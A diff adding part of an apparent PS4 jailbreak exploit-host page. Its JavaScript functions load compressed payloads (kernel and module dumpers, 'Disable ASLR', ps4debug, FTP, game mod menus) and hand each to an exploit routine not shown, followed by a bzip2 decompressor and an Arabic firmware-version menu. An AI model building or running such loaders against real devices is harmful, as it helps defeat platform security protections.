+setTimeout(function(){let array = loadFile('dumpermgu.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_todex(){
+msgs.innerHTML="Loading ToDex... Please Wait";
+LoadedMSG = "ToDex Loaded ...";
+setTimeout(function(){let array = loadFile('todex.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_ftp(){
+msgs.innerHTML="Loading FTP... Please Wait";
+LoadedMSG = "FTP Loaded ..."
+setTimeout(function(){let array = loadFile('ftp.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_app2usb(){
+msgs.innerHTML="Loading App2USB... Please Wait";
+LoadedMSG = "App2USB Loaded ..."
+setTimeout(function(){let array = loadFile('app2usb.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_dbackup(){
+msgs.innerHTML="Loading DB Backup... Please Wait";
+LoadedMSG = "DB Backup Loaded ..."
+setTimeout(function(){let array = loadFile('backup.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_dbrestore(){
+msgs.innerHTML="Loading DB Restore... Please Wait";
+LoadedMSG = "DB Restore Loaded ..."
+setTimeout(function(){let array = loadFile('restore.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_enablebUpdates(){
+msgs.innerHTML="Loading Enable Updates... Please Wait";
+LoadedMSG = "Enable Updates Loaded ..."
+setTimeout(function(){let array = loadFile('enable-updates.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_disableUpdates(){
+msgs.innerHTML="Loading Disable Updates... Please Wait";
+LoadedMSG = "Disable Updates Loaded ..."
+setTimeout(function(){let array = loadFile('disable-updates.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_historyBlocker(){
+msgs.innerHTML="Loading History Blocker... Please Wait";
+LoadedMSG = "History Blocker Loaded ..."
+setTimeout(function(){let array = loadFile('history-blocker.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_kernelDump(){
+msgs.innerHTML="Loading Kernel Dumper... Please Wait";
+LoadedMSG = "Kernel Dumper Loaded ..."
+setTimeout(function(){let array = loadFile('kernel-dumper.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_moduleDump(){
+msgs.innerHTML="Loading Module Dumper... Please Wait";
+LoadedMSG = "Module Dumper Loaded ..."
+setTimeout(function(){let array = loadFile('module-dumper.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_ps4debug(){
+msgs.innerHTML="Loading PS4 Debug... Please Wait";
+LoadedMSG = "PS4 Debug Loaded ..."
+setTimeout(function(){let array = loadFile('ps4debug.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_disbAslr(){
+msgs.innerHTML="Loading Disable ASLR... Please Wait";
+LoadedMSG = "Disable ASLR Loaded ..."
+setTimeout(function(){let array = loadFile('disable-aslr.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_exitidu(){
+msgs.innerHTML="Loading Exit IDU... Please Wait";
+LoadedMSG = "Exit IDU Loaded ..."
+setTimeout(function(){let array = loadFile('exit-idu.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_rifRen(){
+msgs.innerHTML="Loading RIF Renamer... Please Wait";
+LoadedMSG = "RIF Renamer Loaded ..."
+setTimeout(function(){let array = loadFile('rif-renamer.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_permUart(){
+msgs.innerHTML="Loading Permanent UART... Please Wait";
+LoadedMSG = "Permanent UART Loaded ..."
+setTimeout(function(){let array = loadFile('permanent-uart.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_webrte(){
+msgs.innerHTML="Loading WebRTE... Please Wait";
+LoadedMSG = "WebRTE Loaded ..."
+setTimeout(function(){let array = loadFile('webrte.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_toolbox(){
+msgs.innerHTML="Loading Orbis-Toolbox... Please Wait";
+LoadedMSG = "Orbis-Toolbox Loaded ..."
+setTimeout(function(){let array = loadFile('orbis-toolbox-900.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_fanthreshold(){
+msgs.innerHTML="Loading Fan Threshold... Please Wait";
+LoadedMSG="Fan Threshold Loaded ..."
+setTimeout(function(){let array = loadFile("fan-threshold" +tempC.value+ ".bin.bz2");}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_southbridge(){
+LoadedMSG = "Payload Loaded ..."
+PLfile = "southbridge.bin";
+load_poc();
+}
+
+function load_arabicGuy100(){
+msgs.innerHTML="Loading Arabic Guy v1.00... Please Wait";
+LoadedMSG = "Arabic Guy v1.00 Loaded ..."
+setTimeout(function(){let array = loadFile('arabic-guy100.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_arabicGuy127(){
+msgs.innerHTML="Loading Arabic Guy v1.27... Please Wait";
+LoadedMSG = "Arabic Guy v1.27 Loaded ..."
+setTimeout(function(){let array = loadFile('arabic-guy127.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_arabicGuy132(){
+msgs.innerHTML="Loading Arabic Guy v1.32... Please Wait";
+LoadedMSG = "Arabic Guy v1.32 Loaded ..."
+setTimeout(function(){let array = loadFile('arabic-guy132.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_arabicGuy133(){
+msgs.innerHTML="Loading Arabic Guy v1.33... Please Wait";
+LoadedMSG = "Arabic Guy v1.33 Loaded ..."
+setTimeout(function(){let array = loadFile('arabic-guy133.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Expulsion(){
+msgs.innerHTML="Loading Expulsion v4.0... Please Wait";
+LoadedMSG = "Expulsion v4.0 Loaded ..."
+setTimeout(function(){let array = loadFile('expulsion-v4.0-1.38.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Lamance(){
+msgs.innerHTML="Loading Lamance v0.9... Please Wait";
+LoadedMSG = "Lamance v0.9 Loaded ..."
+setTimeout(function(){let array = loadFile('lamance-v0.9-1.38.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_WildeModz148(){
+msgs.innerHTML="Loading WildeModz-1.48... Please Wait";
+LoadedMSG = "WildeModz-1.48 Loaded ..."
+setTimeout(function(){let array = loadFile('wildemodz-1.48.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_beefQueef147(){
+msgs.innerHTML="Loading Beef Queef Mod v1.47... Please Wait";
+LoadedMSG = "Beef Queef Mod v1.47 Loaded ..."
+setTimeout(function(){let array = loadFile('beefqueefmod-unified-147e.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Oysters100(){
+msgs.innerHTML="Loading Oysters Menu v1.00... Please Wait";
+LoadedMSG = "Oysters Menu v1.00 Loaded ..."
+setTimeout(function(){let array = loadFile('oystersmenu-v1.00.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Oysters113(){
+msgs.innerHTML="Loading Oysters Menu v1.13... Please Wait";
+LoadedMSG = "Oysters Menu v1.13 Loaded ..."
+setTimeout(function(){let array = loadFile('oystersmenu-v1.13.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Oysters119(){
+msgs.innerHTML="Loading Oysters Menu v1.19... Please Wait";
+LoadedMSG = "Oysters Menu v1.19 Loaded ..."
+setTimeout(function(){let array = loadFile('oystersmenu-v1.19.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Oysters124(){
+msgs.innerHTML="Loading Oysters Menu v1.24... Please Wait";
+LoadedMSG = "Oysters Menu v1.24 Loaded ..."
+setTimeout(function(){let array = loadFile('oystersmenu-v1.24.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Oysters129(){
+msgs.innerHTML="Loading Oysters Menu v1.29... Please Wait";
+LoadedMSG = "Oysters Menu v1.29 Loaded ..."
+setTimeout(function(){let array = loadFile('oystersmenu-v1.29.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+//MODDED BY HIPPIE BZIP2.JS
+var bzip2 = {};
+
+bzip2.array = function(bytes) {
+  var bit = 0, byte = 0;
+  var BITMASK = [0, 0x01, 0x03, 0x07, 0x0F, 0x1F, 0x3F, 0x7F, 0xFF];
+  return function(n) {
+    var result = 0;
+    while (n > 0) {
+      var left = 8 - bit;
+      if (n >= left) {
+        result <<= left;
+        result |= (BITMASK[left] & bytes[byte++]);
+        bit = 0;
+        n -= left;
+      } else {
+        result <<= n;
+        result |= ((bytes[byte] & (BITMASK[n] << (8 - n - bit))) >> (8 - n - bit));
+        bit += n;
+        n = 0;
+      }
+    }
+    return result;
+  }
+};
+
+bzip2.simple = function(bits) {
+  var size = bzip2.header(bits);
+  var all = [], chunk = [];
+  do {
+    all = all.concat(chunk);
+    chunk = bzip2.decompress(bits, size);
+  } while (chunk != -1);
+  return Uint8Array.from(all);
+};
+
+bzip2.header = function(bits) {
+  if (bits(8 * 3) != 4348520) throw "No magic number found.";
+  var i = bits(8) - 48;
+  if (i < 1 || i > 9) throw "Not a bzip2 archive.";
+  return i;
+};
+
+// Param1: a function for reading the block data (starting with 0x314159265359)
+// Param2: block size (0-9) (optional, defaults to 9)
+// Param3: length at which to stop decompressing and return the output
+bzip2.decompress = function(bits, size, len) {
+  var MAX_HUFCODE_BITS = 20;
+  var MAX_SYMBOLS = 258;
+  var SYMBOL_RUNA = 0;
+  var SYMBOL_RUNB = 1;
+  var GROUP_SIZE = 50;
+
+  var bufsize = 100000 * size;
+  for (var h = "", i = 0; i < 6; i++) h += bits(8).toString(16);
+  if (h == "177245385090") return -1; // Last block
+  if (h != "314159265359") throw "Not valid bzip2 data.";
+  bits(32); // Ignore CRC codes
+  if (bits(1)) throw "Unsupported obsolete version.";
+  var origPtr = bits(24);
+  if(origPtr > bufsize) throw "Initial position larger than buffer size.";
+  var t = bits(16);
+  var symToByte = new Uint8Array(256),
+      symTotal = 0;
+  for (i = 0; i < 16; i++) {
+    if (t & (1 << (15 - i))) {
+      var k = bits(16);
+      for (j = 0; j < 16; j++) {
+        if (k & (1 << (15 - j))) {
+          symToByte[symTotal++] = (16 * i) + j;
+        }
+      }
+    }
+  }
+
+  var groupCount = bits(3);
+  if (groupCount < 2 || groupCount > 6) throw "Error 1 while decompressing.";
+  var nSelectors = bits(15);
+  if (nSelectors == 0) throw "Error 2 while decompressing.";
+  var mtfSymbol = []; // TODO: possibly replace JS array with typed arrays
+  for (var i = 0; i < groupCount; i++) mtfSymbol[i] = i;
+  var selectors = new Uint8Array(32768);
+
+  for (var i = 0; i < nSelectors; i++) {
+    for (var j = 0; bits(1); j++) if (j >= groupCount) throw "Error 3 while decompressing.";
+    var uc = mtfSymbol[j];
+    mtfSymbol.splice(j, 1); // This is a probably inefficient MTF transform
+    mtfSymbol.splice(0, 0, uc);
+    selectors[i] = uc;
+  }
+
+  var symCount = symTotal + 2;
+  var groups = [];
+  for (var j = 0; j < groupCount; j++) {
+    var length = new Uint8Array(MAX_SYMBOLS),
+        temp = new Uint8Array(MAX_HUFCODE_BITS + 1);
+    t = bits(5); // Lengths
+    for (var i = 0; i < symCount; i++) {
+      while (true) {
+        if (t < 1 || t > MAX_HUFCODE_BITS) throw "Error 4 while decompressing.";
+        if (!bits(1)) break;
+        if (!bits(1)) t++;
+        else t--;
+      }
+      length[i] = t;
+    }
+    var  minLen,  maxLen;
+    minLen = maxLen = length[0];
+    for (var i = 1; i < symCount; i++) {
+      if (length[i] > maxLen) maxLen = length[i];
+      else if (length[i] < minLen) minLen = length[i];
+    }
+    var hufGroup;
+    hufGroup = groups[j] = {};
+    hufGroup.permute = new Uint32Array(MAX_SYMBOLS);
+    hufGroup.limit = new Uint32Array(MAX_HUFCODE_BITS + 1);
+    hufGroup.base = new Uint32Array(MAX_HUFCODE_BITS + 1);
+    hufGroup.minLen = minLen;
+    hufGroup.maxLen = maxLen;
+    var base = hufGroup.base.subarray(1);
+    var limit = hufGroup.limit.subarray(1);
+    var pp = 0;
+    for (var i = minLen; i <= maxLen; i++)
+      for (var t = 0; t < symCount; t++)
+      if (length[t] == i) hufGroup.permute[pp++] = t;
+      for (i = minLen; i <= maxLen; i++) temp[i] = limit[i] = 0;
+      for (i = 0; i < symCount; i++) temp[length[i]]++;
+      pp = t = 0;
+      for (i = minLen; i < maxLen; i++) {
+        pp += temp[i];
+        limit[i] = pp - 1;
+        pp <<= 1;
+        base[i + 1] = pp - (t += temp[i]);
+      }
+      limit[maxLen] = pp + temp[maxLen] - 1;
+      base[minLen] = 0;
+  }
+  var byteCount = new Uint32Array(256);
+  for (var i = 0; i < 256; i++) mtfSymbol[i] = i;
+  var runPos, count, symCount, selector;
+  runPos = count = symCount = selector = 0;
+  var buf = new Uint32Array(bufsize);
+  while (true) {
+    if (!(symCount--)) {
+      symCount = GROUP_SIZE - 1;
+      if (selector >= nSelectors) throw "Error 5 while decompressing.";
+      hufGroup = groups[selectors[selector++]];
+      base = hufGroup.base.subarray(1);
+      limit = hufGroup.limit.subarray(1);
+    }
+    i = hufGroup.minLen;
+    j = bits(i);
+    while (true) {
+      if (i > hufGroup.maxLen) throw "Error 6 while decompressing.";
+      if (j <= limit[i]) break;
+      i++;
+      j = (j << 1) | bits(1);
+    }
+    j -= base[i];
+    if (j < 0 || j >= MAX_SYMBOLS) throw "Error 7 while decompressing.";
+    var nextSym = hufGroup.permute[j];
+    if (nextSym == SYMBOL_RUNA || nextSym == SYMBOL_RUNB) {
+      if (!runPos) {
+        runPos = 1;
+        t = 0;
+      }
+      if (nextSym == SYMBOL_RUNA) t += runPos;
+      else t += 2 * runPos;
+      runPos <<= 1;
+      continue;
+    }
+    if (runPos) {
+      runPos = 0;
+      if (count + t >= bufsize) throw "Error 8 while decompressing.";
+      uc = symToByte[mtfSymbol[0]];
+      byteCount[uc] += t;
+      while (t--) buf[count++] = uc;
+    }
+    if (nextSym > symTotal) break;
+    if (count >= bufsize) throw "Error 9 while decompressing.";
+    i = nextSym -1;
+    uc = mtfSymbol[i];
+    mtfSymbol.splice(i, 1);
+    mtfSymbol.splice(0, 0, uc);
+    uc = symToByte[uc];
+    byteCount[uc]++;
+    buf[count++] = uc;
+  }
+  if (origPtr < 0 || origPtr >= count) throw "Error 10 while decompressing.";
+  var j = 0;
+  for (var i = 0; i < 256; i++) {
+    k = j + byteCount[i];
+    byteCount[i] = j;
+    j = k;
+  }
+  for (var i = 0; i < count; i++) {
+    uc = buf[i] & 0xff;
+    buf[byteCount[uc]] |= (i << 8);
+    byteCount[uc]++;
+  }
+  var pos = 0, current = 0, run = 0;
+  if (count) {
+    pos = buf[origPtr];
+    current = (pos & 0xff);
+    pos >>= 8;
+    run = -1;
+  }
+  count = count;
+  var output = [];
+  var copies, previous, outbyte;
+  if (!len) len = Infinity;
+  while (count) {
+    count--;
+    previous = current;
+    pos = buf[pos];
+    current = pos & 0xff;
+    pos >>= 8;
+    if (run++ == 3) {
+      copies = current;
+      outbyte = previous;
+      current = -1;
+    } else {
+      copies = 1;
+      outbyte = current;
+    }
+    while (copies--) {
+      output.push(outbyte);
+      if (!--len) return output;
+    }
+    if (current != previous) run = 0;
+  }
+  return output;
+};
+</script>
+</body>
+</html>
+
+        <button class="back-btn" onclick="hideContent('content900')">العودة إلى القائمة الرئيسية</button>
+    </div>
+
+    <script>
+        // إظهار وإخفاء المحتوى
+        document.getElementById('btn505').addEventListener('click', function() {
+            showContent('content505');
+        });
+        
+        document.getElementById('btn672').addEventListener('click', function() {
+            showContent('content672');
+        });
+        
+        document.getElementById('btn702').addEventListener('click', function() {
+            showContent('content702');
+        });
+        
+        document.getElementById('btn750').addEventListener('click', function() {
+            showContent('content750');
+        });
+        
+        document.getElementById('btn900').addEventListener('click', function() {
+            showContent('content900');
+        });
+
+        function showContent(id) {
+            // إخفاء كل المحتويات أولاً
+            var contents = document.getElementsByClassName('content');
+            for (var i = 0; i < contents.length; i++) {
+                contents[i].style.display = 'none';
+            }
+            
+            // إظهار المحتوى المطلوب
+            document.getElementById(id).style.display = 'block';
+            
+            // التمرير إلى الأعلى
+            window.scrollTo(0, 0);
+        }
+
+        function hideContent(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+    </script>
+</body>
+</html>
